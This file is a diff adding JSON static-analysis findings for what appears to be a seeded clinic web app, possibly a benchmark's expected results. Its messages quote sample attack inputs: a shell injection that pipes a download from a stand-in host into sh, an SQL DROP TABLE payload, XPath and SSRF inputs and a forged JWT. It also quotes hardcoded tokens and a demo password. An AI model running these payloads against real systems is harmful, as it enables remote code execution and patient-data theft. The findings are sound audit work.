@@ -1,0 +1,608 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.os-command-injection.label-print",
+      "path": "lib/label-print-station.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 100,
+        "offset": 0
+      },
+      "extra": {
+        "message": "printSpecimenLabel() builds a shell command by interpolating user-controlled `labelPreset` and `stationId` into `spawn(\"sh\", [\"-c\", ...])`. The values come directly from the request body in app/api/staff/label-print-station/route.ts (only `requireUser()`, so any signed-in user including PATIENT can call it). An attacker can inject shell metacharacters (e.g. stationId = \"; curl http://evil | sh; #\") for remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.os-command-injection.referral-letter",
+      "path": "lib/reporting.ts",
+      "start": {
+        "line": 62,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 62,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderReferralLetter() runs `execSync(\\`pandoc ${sourcePath} -o ${outputPath}\\`)` where outputPath embeds the caller-supplied `format` string. `format` comes unvalidated from the query string in app/api/visit-summaries/referral-letter/route.ts (`searchParams.get(\"format\")`). Any user who can view a released summary (including a PATIENT) can inject a command such as `format=x; touch /tmp/pwn #`, achieving remote code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection.patient-directory",
+      "path": "lib/reporting.ts",
+      "start": {
+        "line": 26,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "fetchSortedPatientDirectory() interpolates `sortPreference` (from the `x-directory-sort` request header) directly into a `$queryRawUnsafe` SQL string: `ORDER BY \"${column}\" ASC`. The column is not allowlisted (contrast with fetchSortedAppointmentQueue). A FRONT_DESK or CLINIC_ADMIN user can inject arbitrary SQL via the header (e.g. `lastName\" ASC; DROP TABLE ...--`).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection.billing-formula",
+      "path": "lib/billing-formulas.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 85,
+        "offset": 0
+      },
+      "extra": {
+        "message": "evaluateSelfPayAdjustment() evaluates the stored `self_pay_adjustment_formula` clinic setting as executable JavaScript via `new Function(\"context\", \\`with (context) { return (${formula}); }\\`)`. The formula is an arbitrary code string from the database; if it is ever influenced by an attacker (or set to a malicious expression), it yields full remote code execution. The sibling `evaluateStandardAdjustment` correctly avoids eval by using a fixed program map.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.missing-auth.archive",
+      "path": "app/api/records/archive/route.ts",
+      "start": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 35,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The archive POST handler performs no authentication or authorization check (no requireUser/requireRole). Any unauthenticated client can POST an arbitrary documentId and change a document's status to ARCHIVED, mutating another patient's record. The companion restore endpoint (records/restore) correctly requires requireUser + assertCanReviewDocument.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.missing-auth.board-search",
+      "path": "app/api/documents/board-search/route.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The document board search endpoint has no authentication check and returns the results of an XPath search over the clinic-wide catalog of verified documents (document names across all patient charts). An unauthenticated attacker can retrieve PHI (document names/categories) without a session.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection.document-catalog",
+      "path": "lib/document-catalog.ts",
+      "start": {
+        "line": 58,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 58,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findLocationDocumentsByStickySearch() interpolates the unescaped `stickySearchTerm` directly into an XPath expression: `//document[contains(name, '${stickySearchTerm}')]`. The term is user-controlled (the `q` query parameter in app/api/documents/board-search/route.ts). An attacker can inject XPath like `') or contains(name,'` to match and enumerate all document records. The sibling `findLocationDocumentsByVerifiedStickySearch` correctly escapes the term.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.partner-packet-import",
+      "path": "lib/partner-document-import.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importSharedReferralPacket() fetches the caller-supplied `documentSourceUrl` without any host/protocol validation. The URL comes from the `x-partner-document-source` header in app/api/partners/referral-packet-import/route.ts. A FRONT_DESK user (or anyone with that role) can supply an internal URL (e.g. http://169.254.169.254/... or localhost) to perform SSRF against internal services. The sibling importVerifiedClearinghousePacket() correctly validates the host against an allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.jwt-signature-not-verified",
+      "path": "lib/network-access.ts",
+      "start": {
+        "line": 40,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readResourceGrantClaims() decodes the JWT payload and trusts its claims WITHOUT verifying the signature or the expiry. app/api/reports/utilization/route.ts uses this function (instead of verifyResourceGrant) and only checks `claims.scope === \"utilization-export\"`. An attacker can forge a grant by base64-encoding `{\"partnerId\":\"x\",\"scope\":\"utilization-export\"}` in the `clinic_partner_grant` cookie and read the utilization report without authentication.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.broken-access-control.idor.dispense-check",
+      "path": "app/api/prescriptions/dispense-check/route.ts",
+      "start": {
+        "line": 5,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The dispense-check endpoint only calls requireUser() (any authenticated user, including PATIENT) and looks up a prescription by the raw `x-prescription-ref` header without scoping it to the caller's patient profile. fetchPrescriptionForHandoffScan() (lib/pharmacy-ops.ts:11) resolves the id directly, returning another patient's name and medication/dosage/instructions. This is an IDOR enabling enumeration of other patients' prescription data.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.broken-access-control.idor.billing-scope",
+      "path": "app/api/portal/billing-scope/route.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The billing-scope endpoint accepts an arbitrary `patientId` from the request body and stores it (base64, unsigned) in the `clinic_billing_scope` cookie without verifying the patient owns that profile. The billing-summary endpoint then reads the claim and returns that patient's name, insuranceProvider and insuranceMemberId via findUnique without an ownership check. A patient can forge the cookie to read any other patient's insurance member id (PHI).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.broken-access-control.mass-assignment.referral-intake",
+      "path": "app/actions.ts",
+      "start": {
+        "line": 796,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 801,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyReferralIntakePacketAction() parses the `packet` form field as JSON and passes the resulting object directly as `data: fields` to prisma.patientProfile.update() with no field allowlist or validation. A front-desk/admin user can submit arbitrary fields (e.g. userId, primaryProviderId, or any other column) to mass-assign values onto a patient record. The sibling applyVerifiedReferralIntakePacketAction() correctly validates the packet against a strict zod schema.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.appointment-confirm",
+      "path": "app/api/appointments/confirm/route.ts",
+      "start": {
+        "line": 41,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "continueAfterConfirmation() takes the attacker-controlled `x-redirect-url` header and, if it starts with '/', passes it straight to NextResponse.redirect(new URL(destination, request.url)). A value of `//evil.com` is a protocol-relative URL that resolves to an attacker host, producing an open redirect. The sibling visit-summaries/shared endpoint correctly validates the destination origin against the request origin.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site (Open Redirect)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.referral-network",
+      "path": "lib/referral-network.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "submitSpecialtyReferralDispatch() sends a hardcoded bearer token (`rfn_9f2c7a41e8b0d3f6a5c9e2b7d4f1a8c3`) in the Authorization header. A credential baked into source code can be extracted by anyone with repository access and used to authenticate to the specialty referral network. The sibling submitDurableEquipmentOrder() correctly requires the token from an environment variable.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.share-link-secret",
+      "path": "lib/share-links.ts",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 4,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "linkKey() falls back to a hardcoded default secret `clinic-share-link-default-secret` when CLINIC_LINK_SECRET is unset. This secret is used to encrypt/decrypt visit-summary share links and appointment confirmation links, so the default value lets anyone forge valid share tokens.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.integrity-secret",
+      "path": "lib/request-integrity.ts",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 4,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "integritySecret() falls back to a hardcoded default `clinic-local-integrity-secret` when SESSION_INTEGRITY_SECRET is unset. This key is used to derive the state-change token that authorizes state-changing actions (e.g. refill notes), so the default value allows forging those tokens.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-data-exposure.webhook-secret-logged",
+      "path": "lib/webhooks.ts",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 70,
+        "offset": 0
+      },
+      "extra": {
+        "message": "deliverClinicWebhookEvent() logs the entire webhook endpoint record (including endpoint.secret) to the console on delivery failure: `console.error(\"clinic webhook delivery failed\", { endpoint, event, error })`. This writes integration secrets to server logs. The sibling deliverPayerSyncEvent() correctly logs only non-secret fields.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.kiosk-roster-state",
+      "path": "lib/kiosk-roster-state.ts",
+      "start": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreKioskRosterFromCookie() parses attacker-controlled XML (from the `lobby_board_roster` cookie, read by the unauthenticated app/api/dashboard/lobby-board-resume/route.ts) with xml2js without rejecting DOCTYPE declarations. The sibling restoreFrontDeskRosterFromCookie() explicitly rejects `<!DOCTYPE` before parsing, indicating this path is meant to block external entity / entity-expansion attacks that the first variant permits.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.misconfiguration.utilization-export",
+      "path": "app/api/partners/utilization-export/route.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The utilization-export endpoint reflects any request Origin verbatim into Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true. Combined with the forgeable grant (readResourceGrantClaims does not verify signatures), any malicious origin can read the export cross-origin. The sibling referral-status endpoint correctly restricts origins to a fixed allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.broken-access-control.mass-assignment.dependent-summary",
+      "path": "app/api/portal/dependent-summary/route.ts",
+      "start": {
+        "line": 42,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The dependent-summary POST handler spreads the entire request body (`{ ...updates }`) into prisma.patientProfile.update() with no field allowlist. Although the patientId is scoped to the signed-in user's own linked profile, the caller can overwrite arbitrary columns on that profile (e.g. primaryProviderId, userId, or any other field), a mass-assignment weakness.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.broken-access-control.filter-injection.triage-view",
+      "path": "app/api/messages/triage-view/route.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 9,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The triage-view endpoint spreads the raw JSON body into the query: `findMessageThreadsMatchingCriteria({ assignedToId: user.id, ...criteria })`. Because `...criteria` follows the forced assignedToId, a caller can override `assignedToId` or supply other where clauses (e.g. `patientId`) to query message threads they are not assigned to, bypassing the intended scoping in findMessageThreadsMatchingCriteria (lib/reporting.ts:96).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-data-exposure.reset-token-in-url",
+      "path": "app/actions.ts",
+      "start": {
+        "line": 179,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 179,
+        "col": 70,
+        "offset": 0
+      },
+      "extra": {
+        "message": "requestPasswordResetAction() redirects with the raw password-reset token placed in the URL query string (`/reset-password?issued=${token}`). Tokens in URLs can leak via browser history, Referer headers, and server/proxy logs, allowing token theft and account takeover.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-200: Exposure of Sensitive Information",
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.seed-demo",
+      "path": "prisma/seed.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The seed script creates every demo account with a hardcoded shared password (`PortalDemo!2026`) and a hardcoded API key (`ck_demo_seeded_token`, line 326). If this seed is ever run against a non-ephemeral environment, all accounts are accessible with a known credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.unbounded-recursion.escalation-chain",
+      "path": "lib/coverage-chain.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveEscalationChain() recursively follows the clinician coverage map with no cycle detection or depth limit. If the map contains a cycle, the recursion never terminates, exhausting the stack (DoS). The sibling resolvePagerRotationChain() correctly guards with a max depth and a seen-set.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
